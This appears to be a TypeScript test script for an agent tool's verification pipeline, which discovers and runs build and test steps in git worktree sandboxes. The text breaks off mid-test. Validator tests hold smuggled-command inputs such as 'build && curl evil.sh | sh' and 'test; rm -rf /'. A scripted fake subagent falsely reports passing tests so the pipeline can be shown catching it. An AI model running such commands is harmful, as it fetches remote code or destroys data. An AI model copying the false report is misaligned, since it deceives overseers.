/**
 * Tests for Automated Verification Pipelines (P8-02).
 *
 * The repository has no test runner (docs/p5.0-01-verification-report.md § 3), so this
 * is a standalone script with its own assertion harness, matching the worktree,
 * delegation, profiles, MCP, skills and memory suites.
 *
 * Nothing here is mocked. Discovery runs against real directories with real
 * `package.json` files and real lockfiles; every step is a real subprocess whose
 * real exit code is read; the sandbox section runs the pipeline inside a real
 * `git worktree` of a real repository and then asserts the primary checkout is
 * untouched. A mocked `spawn` would prove only that the test agrees with itself,
 * and the entire claim of this subsystem is that it does not take a claim on
 * trust.
 *
 * The one thing that is faked is the agent process, in the delegation section,
 * for the reason the P7-01 suite fakes it: an agent CLI may not be installed on
 * the machine running this.
 *
 * Run:  pnpm --filter asterim exec tsx src/services/verification/__tests__/VerificationPipelineService.test.ts
 */

import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import path from 'path';

const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'asterim-verification-'));
process.env.ASTERIM_DATA_DIR = tmpDir;

// --- Assertion harness ---

let passed = 0;
let failed = 0;
const failures: string[] = [];

function check(label: string, condition: boolean, detail?: string): void {
  if (condition) {
    passed++;
    console.log(`  PASS  ${label}`);
  } else {
    failed++;
    failures.push(label);
    console.log(`  FAIL  ${label}${detail ? `  — ${detail}` : ''}`);
  }
}

function equal(label: string, actual: unknown, expected: unknown): void {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  check(
    label,
    ok,
    ok ? undefined : `expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`
  );
}

function describe(name: string): void {
  console.log(`\n${name}`);
}

const scratchDirs: string[] = [];

/** A directory of its own for one scenario, cleaned up at the end. */
function scratch(label: string): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `asterim-verify-${label}-`)));
  scratchDirs.push(dir);
  return dir;
}

function cleanup(): void {
  for (const dir of [...scratchDirs, tmpDir]) {
    try {
      fs.rmSync(dir, { recursive: true, force: true });
    } catch (err) {
      console.error(`[cleanup] failed to remove ${dir}:`, (err as Error).message);
    }
  }
  console.log(`\n[cleanup] removed ${scratchDirs.length + 1} temporary directories`);
}

// DatabaseService and EventBus export singletons constructed at import time, so
// `require` is used instead of `import`, whose bindings would hoist above the
// ASTERIM_DATA_DIR assignment.
const { dbService } = require('../../DatabaseService');
const { eventBus } = require('../../EventBus');
const { profileService } = require('../../ai/ProfileService');
const {
  VerificationPipelineService,
  selectSteps,
  verificationPipelineService
} = require('../VerificationPipelineService');
const {
  loadThreadVerificationReport,
  saveThreadVerificationReport
} = require('../threadVerificationStore');
const {
  AgentDelegationService,
  MAX_STEP_OUTPUT_ON_RESULT,
  formatDelegationReport,
  normalizeStepNames
} = require('../../ai/AgentDelegationService');
const { gitWorktreeService } = require('../../git/GitWorktreeService');
const {
  DEFAULT_VERIFICATION_TIMEOUT_MS,
  MAX_VERIFICATION_OUTPUT_CHARS,
  MAX_VERIFICATION_TIMEOUT_MS,
  isSafeScriptName,
  summarizeVerificationReport
} = require('@asterim/shared');
const Fastify = require('fastify');
const worktreeRoutes = require('../../../routes/worktrees').default;

const service = new VerificationPipelineService();

/** A step's command, written so it runs identically wherever node runs. */
function nodeCommand(body: string): string {
  return `node -e "${body.replace(/"/g, '\\"')}"`;
}

/** Writes a `package.json` with the given scripts. */
function writeManifest(dir: string, scripts: Record<string, string>, extra: Record<string, unknown> = {}): void {
  fs.writeFileSync(
    path.join(dir, 'package.json'),
    JSON.stringify({ name: 'fixture', version: '1.0.0', scripts, ...extra }, null, 2)
  );
}

/** A project whose dependencies are installed, which is what makes scripts runnable. */
function installDependencies(dir: string): void {
  fs.mkdirSync(path.join(dir, 'node_modules'), { recursive: true });
}

function writeConfig(dir: string, contents: unknown, file = 'verification.json'): void {
  fs.mkdirSync(path.join(dir, '.asterim'), { recursive: true });
  fs.writeFileSync(
    path.join(dir, '.asterim', file),
    typeof contents === 'string' ? contents : JSON.stringify(contents, null, 2)
  );
}

async function main(): Promise<void> {
  // --- Discovery from package.json --------------------------------------------

  describe('discoverPipeline reads a Node project’s own lifecycle scripts');
  {
    const dir = scratch('node');
    installDependencies(dir);
    writeManifest(dir, {
      dev: 'vite',
      build: 'tsup',
      test: 'tsx src/x.test.ts',
      lint: 'eslint .',
      typecheck: 'tsc --noEmit'
    });
    fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), 'lockfileVersion: 9\n');

    const steps = service.discoverPipeline(dir);
    equal(
      'the four lifecycle scripts are found, cheapest first',
      steps.map((step: { name: string }) => step.name),
      ['typecheck', 'lint', 'test', 'build']
    );
    equal(
      'each one runs through the package manager the lockfile names',
      steps.map((step: { command: string }) => step.command),
      ['pnpm run typecheck', 'pnpm run lint', 'pnpm run test', 'pnpm run build']
    );
    check('and a script that is not verification is left alone', !JSON.stringify(steps).includes('dev'));
  }

  describe('the package manager comes from the lockfile');
  {
    const cases: Array<[string, string]> = [
      ['pnpm-lock.yaml', 'pnpm'],
      ['yarn.lock', 'yarn'],
      ['bun.lockb', 'bun'],
      ['package-lock.json', 'npm']
    ];

    for (const [lockfile, manager] of cases) {
      const dir = scratch(manager);
      installDependencies(dir);
      writeManifest(dir, { test: 'node test.js' });
      fs.writeFileSync(path.join(dir, lockfile), '');
      equal(`${lockfile} means ${manager}`, service.detectPackageManager(dir), manager);
      equal(
        `and the step is run with it`,
        service.discoverPipeline(dir)[0].command,
        `${manager} run test`
      );
    }

    // No lockfile: Corepack's own field is the next best statement.
    const declared = scratch('corepack');
    installDependencies(declared);
    writeManifest(declared, { test: 'node test.js' }, { packageManager: 'yarn@4.1.0' });
    equal('a packageManager field is honoured when nothing is locked', service.detectPackageManager(declared), 'yarn');

    const bare = scratch('bare');
    installDependencies(bare);
    writeManifest(bare, { test: 'node test.js' });
    equal('and npm is what is left', service.detectPackageManager(bare), 'npm');
  }

  describe('discovery is tolerant of what a project does not have');
  {
    const partial = scratch('partial');
    installDependencies(partial);
    writeManifest(partial, { build: 'tsup' });
    equal(
      'a project with only a build has only a build',
      service.discoverPipeline(partial).map((step: { name: string }) => step.name),
      ['build']
    );

    const aliased = scratch('aliased');
    installDependencies(aliased);
    writeManifest(aliased, { 'type-check': 'tsc --noEmit' });
    equal(
      'a typechecker spelled differently is still a typecheck',
      service.discoverPipeline(aliased).map((step: { name: string; command: string }) => step.command),
      ['npm run type-check']
    );

    const empty = scratch('empty');
    equal('a directory with nothing in it has no pipeline', service.discoverPipeline(empty), []);

    const noScripts = scratch('noscripts');
    installDependencies(noScripts);
    fs.writeFileSync(path.join(noScripts, 'package.json'), JSON.stringify({ name: 'x' }));
    equal('nor does a manifest with no scripts', service.discoverPipeline(noScripts), []);

    const broken = scratch('broken');
    installDependencies(broken);
    fs.writeFileSync(path.join(broken, 'package.json'), '{ not json');
    equal('a manifest that is not JSON is not a crash', service.discoverPipeline(broken), []);

    equal('and neither is a directory that does not exist', service.discoverPipeline('/nowhere/at/all'), []);
  }

  describe('a directory whose dependencies are not installed has nothing to run');
  {
    // The case this exists for is a worktree sandbox: `node_modules` is not
    // tracked, so a fresh checkout cannot run `tsc`. Reporting that as a failed
    // typecheck would blame the subagent for the sandbox's own emptiness, which
    // is precisely the false signal this subsystem exists to remove.
    const dir = scratch('uninstalled');
    writeManifest(dir, { typecheck: 'tsc --noEmit', test: 'vitest run' });
    fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), '');

    equal('the dependencies are seen to be missing', service.hasInstalledDependencies(dir), false);
    equal('so no package.json steps are discovered', service.discoverPipeline(dir), []);

    installDependencies(dir);
    equal('and installing them is what makes the pipeline appear', service.discoverPipeline(dir).length, 2);

    // An explicit pipeline never needed node_modules: it is how a Rust, Go or
    // Python project says what verifying it means.
    const polyglot = scratch('polyglot');
    writeConfig(polyglot, { steps: [{ name: 'test', command: 'cargo test --all' }] });
    equal(
      'an explicitly configured pipeline runs regardless',
      service.discoverPipeline(polyglot).map((step: { command: string }) => step.command),
      ['cargo test --all']
    );
  }

  // --- Discovery from .asterim/verification.json --------------------------------

  describe('an explicit .asterim/verification.json is the pipeline');
  {
    const dir = scratch('config');
    installDependencies(dir);
    writeManifest(dir, { test: 'npm test' });
    writeConfig(dir, {
      steps: [
        { name: 'typecheck', command: 'cargo check', timeoutMs: 120000 },
        { name: 'test', command: 'cargo test' }
      ]
    });

    const steps = service.discoverPipeline(dir);
    equal('the configured steps are the ones returned', steps.map((s: { name: string }) => s.name), [
      'typecheck',
      'test'
    ]);
    equal('with the commands as written', steps[0].command, 'cargo check');
    equal('and the timeout the operator asked for', steps[0].timeoutMs, 120000);
    equal('a step with no timeout gets none of its own', steps[1].timeoutMs, undefined);
    check('the package.json is not consulted at all', !JSON.stringify(steps).includes('npm test'));

    const bare = scratch('config-array');
    writeConfig(bare, ['pytest -q', 'ruff check .']);
    const inferred = service.discoverPipeline(bare);
    equal('a bare array of commands is accepted too', inferred.length, 2);
    equal('and each is named after what it runs', inferred.map((s: { name: string }) => s.name), [
      'pytest',
      'ruff'
    ]);

    const runner = scratch('config-runner');
    writeConfig(runner, ['pnpm run typecheck']);
    equal(
      'a runner invocation is named for what it is running, not the runner',
      runner && service.discoverPipeline(runner)[0].name,
      'typecheck'
    );

    const alternate = scratch('config-alternate');
    writeConfig(alternate, { steps: [{ command: 'go test ./...' }] }, 'pipeline.json');
    equal(
      'pipeline.json is read when verification.json is absent',
      service.discoverPipeline(alternate).length,
      1
    );

    const precedence = scratch('config-precedence');
    writeConfig(precedence, ['echo first'], 'verification.json');
    writeConfig(precedence, ['echo second'], 'pipeline.json');
    equal(
      'and verification.json wins when both are there',
      service.discoverPipeline(precedence)[0].command,
      'echo first'
    );

    const silenced = scratch('config-empty');
    installDependencies(silenced);
    writeManifest(silenced, { test: 'npm test' });
    writeConfig(silenced, { steps: [] });
    equal(
      'an operator who configured no steps has said not to verify this project',
      service.discoverPipeline(silenced),
      []
    );

    const malformed = scratch('config-malformed');
    installDependencies(malformed);
    writeManifest(malformed, { test: 'npm test' });
    writeConfig(malformed, '{ this is not json');
    equal(
      'a configuration file that cannot be read falls back rather than failing',
      service.discoverPipeline(malformed).map((s: { command: string }) => s.command),
      ['npm run test']
    );

    const junk = scratch('config-junk');
    writeConfig(junk, { steps: [null, 42, { name: 'x' }, '  ', { command: '   ' }, 'echo ok'] });
    equal(
      'entries that are not steps are dropped, not guessed at',
      service.discoverPipeline(junk).map((s: { command: string }) => s.command),
      ['echo ok']
    );

    const clamped = scratch('config-clamped');
    writeConfig(clamped, { steps: [{ name: 'test', command: 'echo ok', timeoutMs: 99999999 }] });
    equal(
      'an absurd timeout is clamped to the bound',
      service.discoverPipeline(clamped)[0].timeoutMs,
      MAX_VERIFICATION_TIMEOUT_MS
    );
  }

  describe('a sandbox is verified with the pipeline the project configured');
  {
    // `.asterim/` is excluded from Git tracking (P8-01), so a worktree checkout
    // of tracked files does not carry it. Without the fallback, every sandboxed
    // delegation would silently lose the operator's configured pipeline.
    const project = scratch('configdir-project');
    writeConfig(project, ['echo from-the-project']);

    const sandbox = scratch('configdir-sandbox');
    installDependencies(sandbox);
    writeManifest(sandbox, { test: 'npm test' });

    equal(
      'without the project, the sandbox falls back to its own manifest',
      service.discoverPipeline(sandbox).map((s: { command: string }) => s.command),
      ['npm run test']
    );
    equal(
      'with it, the operator’s pipeline is what runs',
      service.discoverPipeline(sandbox, { configDir: project }).map((s: { command: string }) => s.command),
      ['echo from-the-project']
    );

    const own = scratch('configdir-own');
    writeConfig(own, ['echo mine']);
    equal(
      'and a directory with its own configuration keeps it',
      service.discoverPipeline(own, { configDir: project })[0].command,
      'echo mine'
    );
  }

  // --- Running one step ---------------------------------------------------------

  describe('runStep — a command that succeeds');
  {
    const dir = scratch('step-ok');
    const result = await service.runStep(
      { name: 'typecheck', command: nodeCommand("console.log('all clean')") },
      dir
    );

    equal('it passes', result.passed, true);
    equal('with the exit code it exited with', result.exitCode, 0);
    equal('under the name it was given', result.name, 'typecheck');
    check('its output is captured', (result.stdoutSummary ?? '').includes('all clean'));
    equal('and there is nothing on stderr to report', result.stderrSummary, undefined);
    check('it is timed', typeof result.durationMs === 'number' && result.durationMs >= 0);
    equal('and there is no error on a step that worked', result.error, undefined);
  }

  describe('runStep — a command that fails');
  {
    const dir = scratch('step-fail');
    const result = await service.runStep(
      { name: 'test', command: nodeCommand("console.error('2 tests failed'); process.exit(3)") },
      dir
    );

    equal('it does not pass', result.passed, false);
    equal('the real exit code is reported', result.exitCode, 3);
    check('and what the command said about it', (result.stderrSummary ?? '').includes('2 tests failed'));
    equal('a non-zero exit is not an error, it is an answer', result.error, undefined);
  }

  describe('runStep — a command that is not installed');
  {
    const dir = scratch('step-missing');
    const result = await service.runStep(
      { name: 'lint', command: 'asterim-definitely-not-a-real-binary --check' },
      dir
    );

    equal('a missing binary fails the step', result.passed, false);
    check('rather than taking the process down', typeof result.exitCode === 'number' || result.exitCode === null);
    check(
      'and the shell’s complaint is carried back',
      /not found|no such file|cannot find/i.test(`${result.stderrSummary ?? ''}${result.error ?? ''}`),
      `stderr: ${result.stderrSummary}, error: ${result.error}`
    );
  }

  describe('runStep — a command that never returns');
  {
    const dir = scratch('step-hang');
    const startedAt = Date.now();
    const result = await service.runStep(
      { name: 'test', command: nodeCommand('setInterval(function () {}, 1000)') },
      dir,
      400
    );
    const elapsed = Date.now() - startedAt;

    equal('a hung step fails', result.passed, false);
    check('it is killed rather than waited on', elapsed < 5000, `took ${elapsed}ms`);
    check('it waited the timeout it was given', elapsed >= 380, `took ${elapsed}ms`);
    check('and the reason says so', /did not finish within/.test(result.error ?? ''), result.error);
    equal('a killed process has no exit code to report', result.exitCode, null);
  }

  describe('runStep — output is bounded on the way in');
  {
    const dir = scratch('step-loud');
    const result = await service.runStep(
      { name: 'build', command: nodeCommand("process.stdout.write('x'.repeat(200000))") },
      dir
    );

    equal('the step still passes', result.passed, true);
    check(
      'but its output is not carried whole',
      (result.stdoutSummary ?? '').length < MAX_VERIFICATION_OUTPUT_CHARS + 100,
      `kept ${(result.stdoutSummary ?? '').length} characters`
    );
    check('and it says it was cut', (result.stdoutSummary ?? '').includes('truncated'));
  }

  describe('runStep — it runs where it was told to');
  {
    const dir = scratch('step-cwd');
    const elsewhere = scratch('step-elsewhere');
    const result = await service.runStep(
      {
        name: 'build',
        command: nodeCommand("require('fs').writeFileSync('artifact.txt', process.cwd())")
      },
      dir
    );

    equal('the step passed', result.passed, true);
    check('its artefact is in the directory it was given', fs.existsSync(path.join(dir, 'artifact.txt')));
    equal(
      'and the working directory really was that one',
      fs.readFileSync(path.join(dir, 'artifact.txt'), 'utf8'),
      dir
    );
    check('nothing was written anywhere else', !fs.existsSync(path.join(elsewhere, 'artifact.txt')));
  }

  describe('runStep — what it refuses');
  {
    const dir = scratch('step-refuse');
    const noCommand = await service.runStep({ name: 'x', command: '   ' }, dir);
    equal('a step with no command fails rather than running a shell', noCommand.passed, false);
    check('saying so', /no command/.test(noCommand.error ?? ''));

    const noDir = await service.runStep({ name: 'x', command: 'echo hi' }, '/nowhere/at/all');
    equal('a directory that does not exist fails the step', noDir.passed, false);
    check('naming the directory', (noDir.error ?? '').includes('/nowhere/at/all'));

    const huge = await service.runStep({ name: 'x', command: `echo ${'a'.repeat(3000)}` }, dir);
    equal('and an absurdly long command is refused', huge.passed, false);
  }

  // --- Running a pipeline --------------------------------------------------------

  describe('runPipeline — every step runs, in order, whatever the last one did');
  {
    const dir = scratch('pipeline');
    writeConfig(dir, {
      steps: [
        { name: 'typecheck', command: nodeCommand("require('fs').appendFileSync('order.txt','1')") },
        { name: 'lint', command: nodeCommand("require('fs').appendFileSync('order.txt','2'); process.exit(1)") },
        { name: 'test', command: nodeCommand("require('fs').appendFileSync('order.txt','3')") }
      ]
    });

    const report = await service.runPipeline(dir);

    equal('every step is reported', report.totalSteps, 3);
    equal('two of them passed', report.passedSteps, 2);
    equal('and one did not', report.failedSteps, 1);
    equal('so the directory is not verified', report.passed, false);
    equal(
      'each step is reported under its own name',
      report.steps.map((step: { name: string }) => step.name),
      ['typecheck', 'lint', 'test']
    );
    equal(
      'with its own verdict',
      report.steps.map((step: { passed: boolean }) => step.passed),
      [true, false, true]
    );
    equal('they ran in the order they were declared', fs.readFileSync(path.join(dir, 'order.txt'), 'utf8'), '123');
    check('a failing step does not stop the ones behind it', fs.readFileSync(path.join(dir, 'order.txt'), 'utf8').includes('3'));
    equal('the report says where it ran', report.cwd, dir);
    check('and when', typeof report.executedAt === 'number' && report.executedAt > 0);
    check('and how long it took', report.durationMs >= 0);
  }

  describe('runPipeline — a directory that verifies');
  {
    const dir = scratch('pipeline-green');
    writeConfig(dir, [nodeCommand('process.exit(0)'), nodeCommand('process.exit(0)')]);
    const report = await service.runPipeline(dir);

    equal('every step passing is a pass', report.passed, true);
    equal('with nothing failed', report.failedSteps, 0);
    check('and the summary says so', summarizeVerificationReport(report).includes('2/2 steps passed'));
  }

  describe('runPipeline — a directory with no pipeline is not a pass');
  {
    const dir = scratch('pipeline-none');
    const report = await service.runPipeline(dir);

    equal('nothing ran', report.totalSteps, 0);
    equal('so nothing was verified', report.passed, false);
    equal('and nothing is claimed to have passed', report.passedSteps, 0);
    equal('nor failed', report.failedSteps, 0);
    check(
      'the summary says what actually happened rather than "failed"',
      summarizeVerificationReport(report).includes('no verification pipeline was discovered')
    );
    equal('a directory that does not exist reads the same way', (await service.runPipeline('/nowhere/at/all')).totalSteps, 0);
  }

  describe('runPipeline — running only some of the steps');
  {
    const dir = scratch('pipeline-subset');
    writeConfig(dir, {
      steps: [
        { name: 'typecheck', command: nodeCommand('process.exit(0)') },
        { name: 'lint', command: nodeCommand('process.exit(1)') },
        { name: 'test', command: nodeCommand('process.exit(0)') }
      ]
    });

    const chosen = await service.runPipeline(dir, { steps: ['test', 'typecheck'] });
    equal('only the named steps run', chosen.totalSteps, 2);
    equal(
      'in the order they were named',
      chosen.steps.map((step: { name: string }) => step.name),
      ['test', 'typecheck']
    );
    equal('and the failing one that was not asked for does not count', chosen.passed, true);

    const unknown = await service.runPipeline(dir, { steps: ['deploy'] });
    equal(
      'a step the project does not have is not invented as a failure',
      [unknown.totalSteps, unknown.failedSteps],
      [0, 0]
    );

    equal('selectSteps ignores anything that is not a name', selectSteps([{ name: 'a', command: 'x' }], [null, 5]), []);
    equal(
      'and matches case-insensitively',
      selectSteps([{ name: 'Test', command: 'x' }], ['test']).map((s: { name: string }) => s.name),
      ['Test']
    );
    equal('an empty selection means all of them', selectSteps([{ name: 'a', command: 'x' }], []).length, 1);
  }

  describe('runPipeline — the caller can override the per-step timeout');
  {
    const dir = scratch('pipeline-timeout');
    writeConfig(dir, [nodeCommand('setInterval(function () {}, 1000)')]);

    const startedAt = Date.now();
    const report = await service.runPipeline(dir, { timeoutMs: 350 });
    const elapsed = Date.now() - startedAt;

    equal('the hung step fails', report.passed, false);
    check('at the timeout the caller gave, not the default', elapsed < DEFAULT_VERIFICATION_TIMEOUT_MS, `took ${elapsed}ms`);
    check('and the summary names the step that hung', summarizeVerificationReport(report).includes('did not finish'));
  }

  describe('the shared helpers hold their own guarantees');
  {
    equal('an ordinary script name is safe', isSafeScriptName('typecheck'), true);
    equal('so is a namespaced one', isSafeScriptName('test:unit'), true);
    equal('a name carrying a second command is not', isSafeScriptName('build && curl evil.sh | sh'), false);
    equal('nor is one with a semicolon', isSafeScriptName('test; rm -rf /'), false);
    equal('nor a substitution', isSafeScriptName('build$(whoami)'), false);
    equal('nor an empty one', isSafeScriptName(''), false);
    equal('nor something that is not a string at all', isSafeScriptName(null), false);

    equal('names are what a caller may select by', normalizeStepNames(['typecheck', 'test']), ['typecheck', 'test']);
    equal('a command smuggled in as a name is dropped', normalizeStepNames(['test; rm -rf /']), undefined);
    equal('and anything that is not a list is nothing', normalizeStepNames('typecheck'), undefined);
  }

  // --- Inside a real Git worktree sandbox ----------------------------------------

  const gitEnv = {
    ...process.env,
    GIT_AUTHOR_NAME: 'Verification Test',
    GIT_AUTHOR_EMAIL: 'verification@test.local',
    GIT_COMMITTER_NAME: 'Verification Test',
    GIT_COMMITTER_EMAIL: 'verification@test.local'
  };

  /** A repository with one commit in it, for the sandbox sections. */
  function makeRepo(label: string): { dir: string; git: (command: string, cwd?: string) => string } {
    const dir = scratch(label);
    const git = (command: string, cwd = dir) =>
      execSync(command, { cwd, encoding: 'utf8', env: gitEnv, stdio: 'pipe' }).trim();
    git('git init -q -b main');
    git('git config user.email verification@test.local');
    git('git config user.name "Verification Test"');
    fs.writeFileSync(path.join(dir, 'app.ts'), 'export const version = 1;\n');
    git('git add -A');
    git('git commit -q -m base');
    return { dir, git };
  }

  describe('verification runs inside the sandbox and nowhere else');
  {
    const { dir: repoDir, git } = makeRepo('sandbox-repo');
    // The operator's pipeline lives in the project, which is the directory the
    // sandbox was branched from and does not itself contain.
    writeConfig(repoDir, {
      steps: [
        {
          name: 'build',
          command: nodeCommand("require('fs').writeFileSync('dist.txt', process.cwd())")
        },
        { name: 'test', command: nodeCommand("process.exit(require('fs').existsSync('app.ts') ? 0 : 1)") }
      ]
    });

    const worktree = await gitWorktreeService.createWorktree(repoDir, 'sandbox-thread');
    check('the sandbox exists', fs.existsSync(worktree.path));
    check(
      'and does not carry the project’s .asterim directory',
      !fs.existsSync(path.join(worktree.path, '.asterim', 'verification.json'))
    );

    const report = await service.runPipeline(worktree.path, { configDir: repoDir });

    equal('the operator’s pipeline is what ran', report.totalSteps, 2);
    equal('and it verified', report.passed, true);
    equal('every step ran in the sandbox', report.cwd, path.resolve(worktree.path));
    equal(
      'which is where the build artefact landed',
      fs.readFileSync(path.join(worktree.path, 'dist.txt'), 'utf8'),
      fs.realpathSync(worktree.path)
    );

    check('the primary checkout has no artefact in it', !fs.existsSync(path.join(repoDir, 'dist.txt')));
    equal('and nothing uncommitted at all', git('git status --porcelain'), '');
    equal(
      'the operator’s own file is exactly as it was',
      fs.readFileSync(path.join(repoDir, 'app.ts'), 'utf8'),
      'export const version = 1;\n'
    );

    await gitWorktreeService.removeWorktree(repoDir, 'sandbox-thread');
  }

  // --- Delegation integration ------------------------------------------------------

  /** Publishes what a running agent session would publish for one thread. */
  function emitAgentMessage(projectId: string, threadId: string, content: string): void {
    eventBus.publish({
      id: `evt-${Math.random()}`,
      timestamp: Date.now(),
      source: 'agent',
      type: 'chat.message',
      payload: { projectId, threadId, role: 'agent', content }
    });
  }

  function emitStatus(projectId: string, threadId: string, status: string, message = ''): void {
    eventBus.publish({
      id: `evt-${Math.random()}`,
      timestamp: Date.now(),
      source: 'agent',
      type: 'agent.status',
      payload: { projectId, threadId, status, message }
    });
  }

  /** A session runner that never touches a PTY (the P7-01 fake). */
  class FakeRunner {
    public started: Array<{ threadId: string }> = [];
    public sent: Array<{ threadId: string; content: string }> = [];
    public reply: ((threadId: string) => void) | null = null;

    public start(params: { threadId: string }): void {
      this.started.push(params);
    }

    public send(params: { threadId: string; content: string }): void {
      this.sent.push(params);
      const isChild = this.started.some(entry => entry.threadId === params.threadId);
      if (isChild && this.reply) this.reply(params.threadId);
    }

    public stop(): void {
      /* nothing to stop */
    }

    public sentTo(threadId: string): string[] {
      return this.sent.filter(entry => entry.threadId === threadId).map(entry => entry.content);
    }

    public reset(): void {
      this.started = [];
      this.sent = [];
      this.reply = null;
    }
  }

  const runner = new FakeRunner();
  const delegation = new AgentDelegationService(runner, profileService, eventBus);
  const { dir: delegationRepo, git: delegationGit } = makeRepo('delegation-repo');
  const PROJECT_ID = 'verification-project';

  function threadRow(id: string): any {
    return dbService.getDb().prepare('SELECT * FROM threads WHERE id = ?').get(id);
  }

  describe('a delegated child’s work is verified before the parent hears about it');
  {
    profileService.initBuiltinProfiles();
    dbService
      .getDb()
      .prepare('INSERT INTO projects (id, name, path) VALUES (?, ?, ?)')
      .run(PROJECT_ID, 'Verification', delegationRepo);
    dbService
      .getDb()
      .prepare('INSERT INTO threads (id, project_id, name) VALUES (?, ?, ?)')
      .run('verify-lead', PROJECT_ID, 'Lead');

    // A pipeline that reads the file the child is about to write, so the report
    // is about the child's work rather than about the repository as it was.
    writeConfig(delegationRepo, {
      steps: [
        {
          name: 'typecheck',
          command: nodeCommand(
            "var s = require('fs').readFileSync('app.ts','utf8'); process.exit(s.indexOf('version = 2') >= 0 ? 0 : 1)"
          )
        },
        { name: 'test', command: nodeCommand('process.exit(0)') }
      ]
    });

    runner.reset();
    runner.reply = (threadId: string) => {
      const row = threadRow(threadId);
      const workingDirectory = row.worktree_path || delegationRepo;
      fs.writeFileSync(path.join(workingDirectory, 'app.ts'), 'export const version = 2;\n');
      emitAgentMessage(PROJECT_ID, threadId, 'Done.\nSUMMARY: Bumped the version.\n');
      emitStatus(PROJECT_ID, threadId, 'idle');
    };

    const result = await delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Bump the version.'
    });

    equal('the child completed', result.status, 'COMPLETED');
    check('it ran in a sandbox', typeof result.worktreePath === 'string');
    check('and a verification report came back with it', !!result.verificationReport);
    equal('every step ran', result.verificationReport.totalSteps, 2);
    equal('and the work verified', result.verificationReport.passed, true);
    equal(
      'the pipeline ran in the sandbox, not the project',
      result.verificationReport.cwd,
      path.resolve(result.worktreePath)
    );

    check('the parent is told', runner.sentTo('verify-lead')[0].includes('VERIFICATION:'));
    check(
      'in terms it can act on',
      runner.sentTo('verify-lead')[0].includes('2/2 steps passed'),
      runner.sentTo('verify-lead')[0]
    );

    equal(
      'the diff is what the child changed, not what verification produced',
      result.changedFiles,
      ['app.ts']
    );
    equal('and the project’s own checkout is still clean', delegationGit('git status --porcelain'), '');

    const stored = loadThreadVerificationReport(result.childThreadId);
    equal('the report survives on the child row', stored?.passed, true);
    equal('with its steps', stored?.totalSteps, 2);
  }

  describe('what travels on the result is bounded, what is stored is not');
  {
    // The result becomes a `delegation.completed` payload, sent to every
    // dashboard watching the project. A failing monorepo build prints more than
    // a socket should carry, and the whole capture is on the row regardless.
    writeConfig(delegationRepo, {
      steps: [{ name: 'build', command: nodeCommand("process.stdout.write('y'.repeat(40000))") }]
    });

    runner.reset();
    runner.reply = (threadId: string) => {
      emitAgentMessage(PROJECT_ID, threadId, 'SUMMARY: Built it.\n');
      emitStatus(PROJECT_ID, threadId, 'idle');
    };

    const result = await delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Produce a very loud build.'
    });

    const onResult = result.verificationReport.steps[0].stdoutSummary ?? '';
    check('the result carries a readable amount', onResult.length <= MAX_STEP_OUTPUT_ON_RESULT + 10, `${onResult.length} characters`);
    equal('and still says the step passed', result.verificationReport.passed, true);

    const stored = loadThreadVerificationReport(result.childThreadId);
    const onRow = stored?.steps[0].stdoutSummary ?? '';
    check('the whole capture is on the row', onRow.length > MAX_STEP_OUTPUT_ON_RESULT, `${onRow.length} characters`);
    equal('which is what the REST surface answers from', onRow.length, 40000);

    // Put the real pipeline back for the sections that follow.
    writeConfig(delegationRepo, {
      steps: [
        {
          name: 'typecheck',
          command: nodeCommand(
            "var s = require('fs').readFileSync('app.ts','utf8'); process.exit(s.indexOf('version = 2') >= 0 ? 0 : 1)"
          )
        },
        { name: 'test', command: nodeCommand('process.exit(0)') }
      ]
    });
  }

  describe('a child that broke the build cannot report otherwise');
  {
    runner.reset();
    // The claim and the truth disagree: the agent says everything passes, the
    // project's own typecheck says the file it wrote is wrong.
    runner.reply = (threadId: string) => {
      const row = threadRow(threadId);
      const workingDirectory = row.worktree_path || delegationRepo;
      fs.writeFileSync(path.join(workingDirectory, 'app.ts'), 'export const version = 99;\n');
      emitAgentMessage(
        PROJECT_ID,
        threadId,
        'All done.\nSUMMARY: Everything typechecks and all tests pass.\n'
      );
      emitStatus(PROJECT_ID, threadId, 'idle');
    };

    const result = await delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Bump the version again.'
    });

    equal('the delegation itself still completed', result.status, 'COMPLETED');
    equal('the child still claims it passed', result.summary, 'Everything typechecks and all tests pass.');
    equal('but the pipeline disagrees', result.verificationReport.passed, false);
    equal('naming the step that failed', result.verificationReport.steps[0].name, 'typecheck');
    equal('with its real exit code', result.verificationReport.steps[0].exitCode, 1);
    equal('and the one that did pass is still reported as passing', result.verificationReport.steps[1].passed, true);

    const toParent = runner.sentTo('verify-lead').join('\n');
    check('the parent is told the claim did not hold', toParent.includes('1 of 2 steps failed'));
    check('and told not to build on it', toParent.includes('did not verify'));
  }

  describe('what is not verified, and why');
  {
    runner.reset();
    runner.reply = (threadId: string) => {
      emitAgentMessage(PROJECT_ID, threadId, 'SUMMARY: Looks fine.\nVERDICT: PASS\n');
      emitStatus(PROJECT_ID, threadId, 'idle');
    };

    const review = await delegation.requestReview({
      parentThreadId: 'verify-lead',
      diff: 'diff --git a/app.ts b/app.ts'
    });
    equal('a reviewer changed nothing, so there is nothing to verify', review.verificationReport, undefined);

    runner.reply = (threadId: string) => {
      emitAgentMessage(PROJECT_ID, threadId, 'SUMMARY: Read it.\n');
      emitStatus(PROJECT_ID, threadId, 'idle');
    };
    const optedOut = await delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Read the code and report back.',
      verifyPipeline: false
    });
    equal('a task that opted out is not verified', optedOut.verificationReport, undefined);
    check('though it still got a sandbox', typeof optedOut.worktreePath === 'string');

    const subset = await delegation.delegateTask({
      parentThreadId: 'verify-lead',
      targetRole: 'Senior Backend Engineer',
      taskDescription: 'Only worth typechecking.',
      verificationSteps: ['test']
    });
    equal('a caller can ask for one step of the pipeline', subset.verificationReport.totalSteps, 1);
